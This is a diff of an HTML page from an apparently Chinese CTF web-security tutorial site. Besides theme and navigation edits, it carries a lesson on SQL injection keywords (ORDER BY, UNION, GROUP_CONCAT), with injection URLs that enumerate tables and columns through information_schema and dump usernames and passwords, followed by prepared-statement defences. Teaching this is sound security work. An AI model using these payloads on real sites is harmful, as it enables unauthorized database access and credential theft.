@@ -9,7 +9,7 @@
       
       
       
-        <link rel="prev" href="..">
+        <link rel="prev" href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/">
       
       
         <link rel="next" href="../SQL-2-information_schema%E5%88%A9%E7%94%A8/">
@@ -20,7 +20,7 @@
     
     
       
-        <title>注入中的几个关键词 - CTF-WEB</title>
+        <title>注入中的关键词 - CTF-Web修炼手册</title>
       
     
     
@@ -41,10 +41,12 @@
         
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans SC";--md-code-font:"Roboto Mono"}</style>
       
     
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
     
     <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -63,7 +65,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="deep-purple">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -84,14 +86,12 @@
     
       
 
-  
-
-<header class="md-header md-header--shadow" data-md-component="header">
+<header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href=".." title="CTF-WEB" class="md-header__button md-logo" aria-label="CTF-WEB" data-md-component="logo">
+    <a href=".." title="CTF-Web修炼手册" class="md-header__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
       
   
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10 17-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9m-6-8L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5z"/></svg>
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -102,13 +102,13 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            CTF-WEB
+            CTF-Web修炼手册
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              注入中的几个关键词
+              注入中的关键词
             
           </span>
         </div>
@@ -121,9 +121,9 @@
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="deep-purple"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
     
-      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
       </label>
     
@@ -131,9 +131,9 @@
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
     
-      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
       </label>
     
@@ -171,6 +171,8 @@
         </button>
       </nav>
       
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
     </form>
     <div class="md-search__output">
       <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
@@ -196,6 +198,76 @@
       
         
           
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  开始
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-tabs__link">
+          
+  
+  
+  环境配置
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  
+  SQL注入技巧
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
         
       
       <main class="md-main" data-md-component="main">
@@ -209,16 +281,18 @@
                     
 
 
+  
 
-<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="CTF-WEB" class="md-nav__button md-logo" aria-label="CTF-WEB" data-md-component="logo">
+    <a href=".." title="CTF-Web修炼手册" class="md-nav__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
       
   
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10 17-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9m-6-8L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5z"/></svg>
 
     </a>
-    CTF-WEB
+    CTF-Web修炼手册
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -235,7 +309,7 @@
   
   
   <span class="md-ellipsis">
-    首页
+    开始
     
   </span>
   
@@ -255,12 +329,19 @@
     
     
     
+      
+      
+        
+      
+    
     
     <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
@@ -268,7 +349,7 @@
   
   
   <span class="md-ellipsis">
-    工具安装
+    环境配置
     
   </span>
   
@@ -279,7 +360,7 @@
         <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
-            工具安装
+            环境配置
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -290,35 +371,12 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    首页
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    首页
+    SQL-Hackbar 安装
     
   </span>
   
@@ -348,20 +406,28 @@
     
     
     
+      
+        
+        
+      
+      
+        
+      
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
             
   
   
   <span class="md-ellipsis">
-    SQL注入
+    SQL注入技巧
     
   </span>
   
@@ -372,7 +438,7 @@
         <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
-            SQL注入
+            SQL注入技巧
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -395,7 +461,7 @@
   
   
   <span class="md-ellipsis">
-    注入中的几个关键词
+    注入中的关键词
     
   </span>
   
@@ -408,7 +474,7 @@
   
   
   <span class="md-ellipsis">
-    注入中的几个关键词
+    注入中的关键词
     
   </span>
   
@@ -876,7 +942,7 @@
 
 
 
-  <h1>注入中的几个关键词</h1>
+  <h1>注入中的关键词</h1>
 
 <p><strong><code>ORDER BY</code></strong>：主要用于测试SQL注入的漏洞，帮助攻击者确定查询返回的列数。如果列数未知，攻击者可以通过调整 <code>ORDER BY</code> 中的数字来找出正确的列数。</p>
 <p><strong><code>UNION</code></strong>：允许将多个 <code>SELECT</code> 查询的结果合并，攻击者可以使用 <code>UNION</code> 来获取数据库中的敏感信息（如表名、列名、数据库版本等）。<code>UNION</code> 查询需要返回与原查询相同数量和类型的列，因此攻击者通常会通过试探来确定合适的查询结构。</p>
@@ -886,13 +952,13 @@
 <h4 id="_1">示例：</h4>
 <p>假设有一个 URL 查询参数 <code>id=1</code>，并且应用程序没有进行有效的输入验证或参数化查询。攻击者可以注入 <code>ORDER BY</code> 子句来测试返回的列数。</p>
 <p><strong>正常查询：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT * FROM products WHERE id = 1;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>SELECT * FROM products WHERE id = 1;
 </code></pre></div>
 <p>如果攻击者注入：</p>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=1&#39; ORDER BY 3 --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>http://example.com/products?id=1&#39; ORDER BY 3 --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT * FROM products WHERE id = 1 ORDER BY 3;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>SELECT * FROM products WHERE id = 1 ORDER BY 3;
 </code></pre></div>
 <ul>
 <li>如果 <code>products</code> 表有至少3列，查询将正常执行，并按第3列对结果进行排序。</li>
@@ -911,13 +977,13 @@
 <h4 id="_2">示例：</h4>
 <p>假设一个查询返回了一张商品列表，攻击者通过注入的 <code>UNION</code> 查询尝试从数据库中获取其他信息，例如表的名称、数据库的版本等。</p>
 <p><strong>正常查询：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name, price FROM products WHERE id = 1;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>SELECT id, name, price FROM products WHERE id = 1;
 </code></pre></div>
 <p>攻击者尝试通过注入 <code>UNION</code> 来合并结果：</p>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=1&#39; UNION SELECT 1,2,3 --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1,2,3 --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1,2,3;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1,2,3;
 </code></pre></div>
 <ul>
 <li>第一部分（<code>SELECT id, name, price</code>）返回正常的商品数据。</li>
@@ -925,10 +991,10 @@
 </ul>
 <p>这两个查询的结果将被合并成一个结果集。如果页面在显示数据时没有进行严格的验证，它可能会同时显示商品列表和常量值。</p>
 <p><strong>注意：</strong> 这个查询之所以能成功，是因为 <code>products</code> 表的查询返回了3列，第二个 <code>UNION SELECT</code> 查询也返回了3列。如果攻击者想要从数据库中获取真实的数据（例如数据库版本或表名），他们可以将 <code>1, 2, 3</code> 替换为实际的查询，如：</p>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=1&#39; UNION SELECT 1, database(), version() --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1, database(), version() --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, database(), version();
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, database(), version();
 </code></pre></div>
 <ul>
 <li><code>database()</code> 返回当前数据库的名称。</li>
@@ -940,19 +1006,19 @@
 <ol>
 <li><strong>获取数据库表名：</strong></li>
 </ol>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=1&#39; UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39; --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39; --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39;;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39;;
 </code></pre></div>
 <p>这个查询将返回数据库 <code>security</code> 中所有表的名称（通过 <code>group_concat</code> 将多个表名连接成一个字符串）。</p>
 <ol>
 <li><strong>获取特定表的列名：</strong></li>
 </ol>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=1&#39; UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39;;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39;;
 </code></pre></div>
 <p>这个查询将返回 <code>users</code> 表的所有列名。</p>
 <h3 id="group_concat"><code>GROUP_CONCAT</code> 的基本用法</h3>
@@ -986,30 +1052,30 @@
 </tbody>
 </table>
 <p>如果我们使用 <code>GROUP_CONCAT</code> 来查询所有的用户名：</p>
-<div class="highlight"><pre><span></span><code>SELECT GROUP_CONCAT(username) FROM users;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>SELECT GROUP_CONCAT(username) FROM users;
 </code></pre></div>
 <p><strong>结果：</strong></p>
-<div class="highlight"><pre><span></span><code>alice,bob,charlie
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>alice,bob,charlie
 </code></pre></div>
 <p>这时，<code>GROUP_CONCAT</code> 会将 <code>username</code> 列的所有值连接成一个以逗号分隔的字符串。</p>
 <h4 id="2">示例 2：使用自定义分隔符</h4>
 <p>你也可以指定一个自定义的分隔符，例如使用破折号（<code>-</code>）作为分隔符：</p>
-<div class="highlight"><pre><span></span><code>SELECT GROUP_CONCAT(username SEPARATOR &#39;-&#39;) FROM users;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>SELECT GROUP_CONCAT(username SEPARATOR &#39;-&#39;) FROM users;
 </code></pre></div>
 <p><strong>结果：</strong></p>
-<div class="highlight"><pre><span></span><code>alice-bob-charlie
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>alice-bob-charlie
 </code></pre></div>
 <h3 id="sql">在 SQL 注入中的应用</h3>
 <p>在 SQL 注入攻击中，攻击者通常会使用 <code>GROUP_CONCAT</code> 来获取大量的表或列信息。由于 <code>GROUP_CONCAT</code> 可以合并多行数据，攻击者可以利用它一次性从数据库中提取多个敏感数据，并通过特定的分隔符将其格式化为易于分析的字符串。</p>
 <h4 id="_4">示例：列出表名</h4>
 <p>假设攻击者想列出数据库中的所有表名，可以通过 <code>information_schema.tables</code> 表来查询。攻击者可能会注入如下 SQL 查询：</p>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39; --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39; --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39;;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39;;
 </code></pre></div>
 <p><strong>结果：</strong></p>
-<div class="highlight"><pre><span></span><code>users,orders,products,logins
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>users,orders,products,logins
 </code></pre></div>
 <ul>
 <li><code>information_schema.tables</code> 是一个系统表，包含了当前数据库中的所有表信息。</li>
@@ -1018,13 +1084,13 @@
 <p>通过这种方式，攻击者可以一次性列出数据库 <code>security</code> 中的所有表名。</p>
 <h4 id="_5">示例：列出特定表的列名</h4>
 <p>攻击者还可以使用 <code>GROUP_CONCAT</code> 获取某个表（如 <code>users</code> 表）中的所有列名：</p>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39;;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39;;
 </code></pre></div>
 <p><strong>结果：</strong></p>
-<div class="highlight"><pre><span></span><code>id,username,password,email
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>id,username,password,email
 </code></pre></div>
 <ul>
 <li><code>information_schema.columns</code> 表包含了数据库中所有表的列信息。</li>
@@ -1033,13 +1099,13 @@
 <p>这样，攻击者就可以获取 <code>users</code> 表的结构。</p>
 <h4 id="_6">示例：列出敏感数据（如用户名和密码）</h4>
 <p>进一步地，攻击者可以使用 <code>GROUP_CONCAT</code> 来提取表中的敏感数据，例如 <code>users</code> 表中的用户名和密码。</p>
-<div class="highlight"><pre><span></span><code>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(username, &#39;-&#39;, password) FROM users --+
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>http://example.com/products?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(username, &#39;-&#39;, password) FROM users --+
 </code></pre></div>
 <p><strong>SQL查询变为：</strong></p>
-<div class="highlight"><pre><span></span><code>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(username, &#39;-&#39;, password) FROM users;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>SELECT id, name FROM products WHERE id = -1 UNION SELECT 1, GROUP_CONCAT(username, &#39;-&#39;, password) FROM users;
 </code></pre></div>
 <p><strong>结果：</strong></p>
-<div class="highlight"><pre><span></span><code>alice-pass123,bob-pass456,charlie-pass789
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>alice-pass123,bob-pass456,charlie-pass789
 </code></pre></div>
 <ul>
 <li><code>GROUP_CONCAT(username, '-', password)</code> 将 <code>users</code> 表中的 <code>username</code> 和 <code>password</code> 连接成一个以破折号分隔的字符串。</li>
@@ -1057,9 +1123,9 @@
 <ol>
 <li><strong>使用预处理语句（Prepared Statements）</strong>： 使用预处理语句可以避免 SQL 查询中直接插入用户输入的数据，防止恶意的 SQL 注入。例如，使用 MySQL 的 <code>mysqli</code> 或 <code>PDO</code> 函数进行预处理查询：</li>
 </ol>
-<div class="highlight"><pre><span></span><code>$stmt = $conn-&gt;prepare(&quot;SELECT * FROM products WHERE id = ?&quot;);
-$stmt-&gt;bind_param(&quot;i&quot;, $id);  // 绑定参数
-$stmt-&gt;execute();
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>$stmt = $conn-&gt;prepare(&quot;SELECT * FROM products WHERE id = ?&quot;);
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>$stmt-&gt;bind_param(&quot;i&quot;, $id);  // 绑定参数
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>$stmt-&gt;execute();
 </code></pre></div>
 <ol>
 <li>
@@ -1092,8 +1158,16 @@ $stmt-&gt;execute();
             </div>
           
           
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
 <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
         </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
         
       </main>
       
@@ -1123,7 +1197,7 @@ $stmt-&gt;execute();
     
     
       
-      <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
     
     
       <script src="../assets/javascripts/bundle.c8b220af.min.js"></script>
